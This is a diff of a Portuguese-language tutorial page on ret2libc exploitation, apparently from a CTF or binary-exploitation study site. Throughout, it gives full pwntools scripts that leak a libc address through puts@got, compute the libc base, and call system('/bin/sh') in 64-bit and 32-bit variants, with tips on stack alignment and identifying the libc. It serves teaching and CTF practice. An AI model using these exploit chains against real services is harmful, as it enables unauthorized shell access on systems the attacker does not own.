@@ -3,145 +3,111 @@ title: ret2libc
 sidebar_position: 4
 ---
 
-ret2libc é um caso de ROP onde, em vez de pular para uma função do próprio programa, pulamos para uma função da libc (biblioteca de funções padrão do C), como `system()`, `execve()`, `mprotect()`, `gets()`, etc. A libc inteira está mapeada na memória do processo, então todas as funções dela estão disponíveis, mesmo que o programa nunca as use.
+ret2libc é ROP usando funções da libc em vez de funções do programa. A libc inteira está mapeada no processo, então `system`, `execve`, `mprotect` e a string `/bin/sh` estão disponíveis mesmo que o binário nunca as use. O objetivo mais comum é `system("/bin/sh")`, também chamado de **ret2system**.
 
-Como exemplo, vamos fazer um ret2libc com a função `system()`, que é a mais comum, pois executa qualquer comando e pode abrir uma shell.
+O problema é saber onde a libc está. Com ASLR, a base muda a cada execução, e o ataque vira dois estágios: **vazar** um endereço da libc e, na mesma execução, **usar** os endereços calculados.
 
-## Antes: Como achar os endereços?
+<Flow
+  title="ret2libc em dois estágios"
+  nodes={[
+    {id: 'a', x: 0, y: 0, t: 'overflow 1', sub: 'puts(puts@got); main', kind: 'ctrl'},
+    {id: 'b', x: 1, y: 0, t: 'leak', sub: 'endereço de puts na libc', kind: 'data'},
+    {id: 'c', x: 2, y: 0, t: 'libc.address', sub: 'leak - offset de puts', kind: 'meta'},
+    {id: 'd', x: 3, y: 0, t: 'overflow 2', sub: 'system("/bin/sh")', kind: 'danger'},
+  ]}
+  edges={[{from: 'a', to: 'b'}, {from: 'b', to: 'c'}, {from: 'c', to: 'd'}]}
+/>
 
-### Sem ASLR
+## Endereço = base + offset
 
-Tudo fica no mesmo lugar de sempre.
-
-Passo 1: Encontre onde a libc está carregada com `ldd` (List Dynamic Dependencies - lista bibliotecas dinâmicas que o programa precisa, como `libc`)
-
-```
-$ ldd ./programa_vulneravel
-    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc0000)
-    # ↑ Aqui! Base da libc = 0x00007ffff7dc0000
-```
-
-Passo 2: Encontre os "offsets" (distâncias)
-
-```
-$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
-  235: 000000000004c350    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
-    # ↑ Offset do system = 0x4c350
-
-$ strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
- 1b45bd /bin/sh
-    # ↑ Offset do /bin/sh = 0x1b45bd (a própria libc tem essa string, usada pelo system())
-```
-
-Passo 3: Some base + offset
-```
-system_addr = 0x00007ffff7dc0000 + 0x4c350  = 0x7ffff7e0c350
-bin_sh_addr = 0x00007ffff7dc0000 + 0x1b45bd = 0x7ffff7f745bd
-```
-
-Com pwntools, isso tudo vira:
+O offset de cada símbolo dentro da libc é fixo para uma dada versão. Só a base varia.
 
 ```py
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-libc.address = 0x00007ffff7dc0000          # base
-system_addr = libc.sym['system']
-bin_sh_addr = next(libc.search(b'/bin/sh\0'))
+libc = ELF('./libc.so.6')                    # a MESMA libc que o alvo usa
+libc.address = base                          # a partir daqui, libc.sym já devolve endereços absolutos
+system = libc.sym['system']
+bin_sh = next(libc.search(b'/bin/sh\0'))     # a libc contém essa string
 ```
 
-### Com ASLR
+Pelo terminal: `readelf -s libc.so.6 | grep " system"` e `strings -t x libc.so.6 | grep /bin/sh`.
 
-Precisamos vazar um endereço primeiro.
+Se o desafio não fornece a libc, identifique-a pelos 12 bits baixos de dois ou três símbolos vazados em [libc.rip](https://libc.rip) ou no [libc-database](https://github.com/niklasb/libc-database). Para rodar o binário localmente com a libc certa, veja [pwninit](../../heap/glibc-versions.mdx).
 
-Parte 1: Vazar um endereço conhecido. A ideia clássica é chamar `puts(puts@got)`: a GOT contém o endereço real do `puts` na libc, e o próprio `puts` imprime esse endereço para nós. Depois voltamos para a `main` para poder fazer o overflow de novo, agora sabendo os endereços.
+**Sem ASLR** (estudo local), a base é constante: aparece em `ldd ./vuln`, em `vmmap` no GDB e em `/proc/<pid>/maps`.
+
+## Estágio 1: leak
+
+A GOT guarda o endereço real das funções já chamadas. Chamando `puts(puts@got)`, o próprio `puts` imprime o endereço dele na libc. Em seguida voltamos para a `main` para repetir o overflow.
 
 ```py
-# x86-64: o argumento vai em rdi
-payload1 = padding + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
+from pwn import *
 
-# x86 (32 bits): o argumento vai na stack, depois do endereço de retorno
-payload1 = padding + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
+elf = context.binary = ELF('./vuln')
+libc = ELF('./libc.so.6')
+p = process()
+
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret     = rop.find_gadget(['ret'])[0]
+
+payload  = b'A' * offset
+payload += p64(pop_rdi) + p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(elf.sym['main'])
+p.sendlineafter(b'> ', payload)
+
+leak = u64(p.recvline().strip().ljust(8, b'\0'))    # puts imprime 6 bytes e para no \0
+libc.address = leak - libc.sym['puts']
+log.info(f'libc base: {hex(libc.address)}')         # tem que terminar em 000
 ```
 
-Parte 2: Calcular base da libc. A randomização só muda a base: o offset de cada função dentro da libc é fixo, então precisamos da **mesma libc do servidor** (CTFs normalmente a fornecem. Se não, descubra pelos últimos 3 dígitos do leak em sites como [libc.rip](https://libc.rip)).
+Cuidados:
+
+- Antes do leak pode haver outras saídas do programa. Consuma-as com `recvuntil` até o ponto certo.
+- A função usada no leak precisa já ter sido chamada (GOT resolvida), ou o binário ter Full RELRO. `puts@got` depois de o programa imprimir algo é sempre seguro.
+- Se um byte do endereço for `0x0a`, o `recvline` corta o leak. Rode de novo.
+- Sem `puts`: `printf(got)` também serve, e `write(1, got, 8)` precisa de `rsi` e `rdx`.
+
+## Estágio 2: `system("/bin/sh")`
 
 ```py
-p.recvuntil(...)                                   # até a saída do puts
-leaked_puts = u64(p.recvline().strip().ljust(8, b'\0'))   # Ex: 0x7ffff7e3d420 (6 bytes impressos, completamos até 8)
-libc.address = leaked_puts - libc.sym['puts']      # base = 0x7ffff7dc0000
-system_addr = libc.sym['system']
-bin_sh_addr = next(libc.search(b'/bin/sh\0'))
-# Parte 3: segundo payload, agora com os endereços certos (ret2system abaixo)
+payload  = b'A' * offset
+payload += p64(ret)                                  # alinhamento da stack
+payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\0')))
+payload += p64(libc.sym['system'])
+p.sendlineafter(b'> ', payload)
+p.interactive()
 ```
 
-## ret2system
+O `ret` extra resolve o [desalinhamento da stack](../buffer-overflow/return-address.md#cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack): sem ele, o `system` costuma morrer em um `movaps`. Como o segundo overflow acontece em outra passada pela `main`, o alinhamento pode ser diferente do primeiro: se com o `ret` falhar, teste sem.
 
+Depois do leak, os gadgets da libc também ficam disponíveis (`ROP(libc)`), o que resolve a falta de `pop rdx` ou até de `pop rdi` no binário. Se `system` falhar por algum motivo (ambiente sem `/bin/sh`, seccomp), as alternativas são `execve` via syscall, um [*one_gadget*](./index.mdx#one_gadget) ou uma chain open/read/write.
 
-ret2system é um caso de ROP ret2libc onde usamos a função `system()`. Essa função executa um comando shell qualquer (abrir app, `ls`, `/bin/sh`, etc).
+## 32 bits
 
-Para fazer um ret2system:
+Os argumentos vão na stack, sem gadgets. Ao entrar em uma função por `ret`, ela espera encontrar `[endereço de retorno][arg1][arg2]...` no topo:
 
-1. Chama-se `system()` no return address
-2. Coloca-se `exit()` após return address. Quando `system()` retornar, `exit()` será executado. (saída limpa)
-3. Coloca-se argumento para system após `exit()`
-
-Para entender como chamar `system()` e passar os parâmetros, recomendo ver o material [Convenção de chamada de funções](../../../extra/call-convention.mdx).
-
-### Para x86 (32-bit):
-
-```
-payload = b"A" * 76           # Preencher buffer até return address
-payload += p32(0xb7e3d850)   # system()    ← Sobrescreve return address
-payload += p32(0xb7e2f5c0)   # exit()      ← Executado quando system() retornar
-payload += p32(0xb7f5d0f8)   # "/bin/sh"   ← Argumento para system()!
-                            #             ↑ ESP+4 (frame antigo) ou EBP+8 (frame novo) quando system() começa
-```
-
-Isso ocorre pois, após chamar system (`pop eip`), `esp` atual = exit(). O system() vai fazer `push rbp`, `mov rbp, rsp`, e teremos:
-
-```
-EBP   → EBP antigo (lixo agora, por causa do BOF)
-EBP+4 → exit() (return address)
-EBP+8 → 1° parâmetro
-```
-
-Isto, pois system() internamente faz:
-
-```
-; system() em x86 (32-bit)
-system:
-    push    ebp                 ; Salva frame pointer antigo
-    mov     ebp, esp            ; Novo frame pointer
-    sub     esp, 0x10           ; Aloca espaço para variáveis locais
-    mov     eax, [ebp+8]        ; Pega primeiro argumento (comando)
-    mov     [esp], eax          ; Prepara argumento para função interna
-    call    do_system           ; Função interna real
-    ; ... mais código ...
-    ret
-
-; system() em x64 (64-bit)  
-system:
-    push    rbp                 ; Salva frame pointer
-    mov     rbp, rsp            ; Novo frame pointer  
-    sub     rsp, 0x10           ; Espaço local
-    mov     QWORD PTR [rsp], rdi  ; Salva argumento na stack para função interna
-    call    do_system           ; Função interna real
-    ; ... mais código ...
-    ret
-```
-
-### para x86-64 (64-bit)
-
-Basta usar um gadget ROP para colocar o primeiro parâmetro em `rdi`, já que os parâmetros são pegos dos registradores.
+<Mem
+  title="ret2system em 32 bits"
+  top="endereços baixos"
+  bottom="endereços altos"
+  rows={[
+    {label: 'padding', kind: 'neutral', h: 1.4},
+    {addr: 'ebp+0x4', label: 'system', kind: 'danger', note: 'return address da função vulnerável'},
+    {addr: 'ebp+0x8', label: 'exit', kind: 'meta', note: 'para onde system retorna'},
+    {addr: 'ebp+0xc', label: '&"/bin/sh"', kind: 'data', note: '1º argumento de system'},
+  ]}
+/>
 
 ```py
-payload = b"A" * 72            # Padding até RIP
-payload += p64(ret)            # gadget: ret (alinhamento da stack, veja abaixo)
-payload += p64(pop_rdi)        # gadget: pop rdi; ret
-payload += p64(bin_sh_addr)    # "/bin/sh" em RDI
-payload += p64(system_addr)    # system()
-payload += p64(exit_addr)      # exit() - opcional
+# Estágio 1
+payload = b'A' * offset + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
+leak = u32(p.recv(4))
+
+# Estágio 2
+payload = b'A' * offset + p32(libc.sym['system']) + p32(libc.sym['exit']) + p32(next(libc.search(b'/bin/sh\0')))
 ```
 
-O `ret` extra no início é quase sempre necessário em 64 bits: o `system()` usa instruções SSE que exigem a stack alinhada em 16 bytes, e ao entrarmos nele por `ret` em vez de `call` a stack fica desalinhada em 8 bytes (veja [Desalinhamento de Stack](../buffer-overflow/return-address.md#cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack)). Se der `SIGSEGV` dentro do `system` em um `movaps`, é isso.
+O `exit` como endereço de retorno é opcional: serve para o processo terminar limpo quando a shell fechar. Em 32 bits não há o problema de alinhamento.
 
-Em 32 bits não há esse problema, e também não há gadgets: os argumentos vão direto na stack, como mostrado acima.
+Para os detalhes de onde cada argumento fica, veja [Convenção de chamada](../../../extra/call-convention.mdx).
